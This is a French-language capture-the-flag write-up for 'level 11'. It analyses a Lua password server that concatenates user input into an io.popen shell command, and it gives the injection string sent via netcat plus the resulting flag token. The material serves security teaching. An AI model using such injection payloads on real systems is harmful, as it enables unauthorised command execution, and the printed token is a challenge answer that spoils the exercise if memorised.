# Niveau 11 : Injection de Commandes via un Script Lua

## Analyse du Programme : `level11.lua`

Le script Lua fourni (`level11.lua`) met en place un serveur TCP simple écoutant sur `127.0.0.1:5151`.

**Fonctionnalité :**

1.  **Écoute les Connexions :** Il attend que les clients se connectent au port 5151 en utilisant `socket.bind` et `server:accept()`.
    ```lua
    local server = assert(socket.bind("127.0.0.1", 5151))
    -- ... plus tard dans la boucle ...
    local client = server:accept()
    ```
2.  **Demande le Mot de Passe :** Lors de la connexion, il envoie une invite "Password: " au client.
    ```lua
    client:send("Password: ")
    ```
3.  **Reçoit l'Entrée :** Il lit la ligne de texte envoyée par le client.
    ```lua
    local l, err = client:receive()
    ```
4.  **Hache l'Entrée :** Il définit une fonction `hash` qui prend l'entrée du client (`pass`) et construit/exécute une commande shell en utilisant `io.popen` pour obtenir le hachage SHA-1.
    ```lua
    function hash(pass)
      prog = io.popen("echo "..pass.." | sha1sum", "r")
      data = prog:read("*all")
      prog:close()
      data = string.sub(data, 1, 40)
      return data
    end
    -- ... appelée plus tard avec ...
    local h = hash(l)
    ```
5.  **Compare le Hachage :** Il compare le hachage SHA-1 calculé (`h`) avec un hachage cible codé en dur.
    ```lua
    if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
        -- Gérer la non-correspondance
    else
        -- Gérer la correspondance
    end
    ```
6.  **Envoie le Résultat :** Il envoie "Gz you dumb\*\n" si les hachages correspondent, ou "Erf nope..\n" sinon.
    ```lua
    client:send("Erf nope..\n");
    -- ou
    client:send("Gz you dumb*\n")
    ```
7.  **Ferme la Connexion :** Il ferme la connexion client.
    ```lua
    client:close()
    ```

Le script s'exécute avec les permissions SUID/SGID pour `flag11`, ce qui signifie que toute commande exécutée via `io.popen` s'exécutera en tant qu'utilisateur `flag11`.

## Vulnérabilité : Injection de Commandes

Le détournement de chemin (path hijacking) du niveau 03 ne fonctionnerait pas ici car le serveur tourne déjà avec son propre environnement lorsque nous démarrons le niveau.
Dans ce cas, la vulnérabilité critique réside dans la fonction `hash`, spécifiquement dans la ligne :

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Le script concatène directement l'entrée fournie par l'utilisateur (pass) dans la chaîne de commande shell sans aucune désinfection ni échappement. Cela permet à un client malveillant d'injecter des métacaractères shell (comme ;, &&, ||, $(...), `...`) pour exécuter des commandes arbitraires sur le serveur avec les privilèges de l'utilisateur flag11.

## Exploitation
Pour exploiter cela, nous devons nous connecter au serveur et envoyer un code d'exploitation qui inclut un séparateur de commandes suivi de la commande getflag.

Une méthode fiable consiste à rediriger la sortie de getflag vers un fichier que nous pourrons lire plus tard.

1. **Se connecter au serveur**:
    ```bash
    nc 127.0.0.1 5151
    ```
2. **Envoyer le code d'exploitation**: Lorsque le mot de passe est demandé, envoyez une chaîne contenant l'injection de commande. 
    Nous redirigeons la sortie de getflag vers un fichier temporaire (par exemple, /tmp/flag11_output) :
    ```bash
    whatever && getflag > /tmp/flag11_output
    ```
    (Note: Le texte spécifique avant &&, comme "whatever", n'a pas d'importance pour l'injection elle-même)

3. **Recevoir la Réponse du Serveur**: Le serveur répondra probablement par "Erf nope..\n" car la comparaison de hachage échouera (la sortie de getflag n'est pas le hachage attendu).

4. **Lire le Drapeau**: Une fois la connexion fermée, lisez le contenu du fichier de sortie :
    ```bash
    cat /tmp/flag11_output
    ```

Cela affichera le drapeau nécessaire pour se connecter en tant que flag11 (par exemple, Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s).
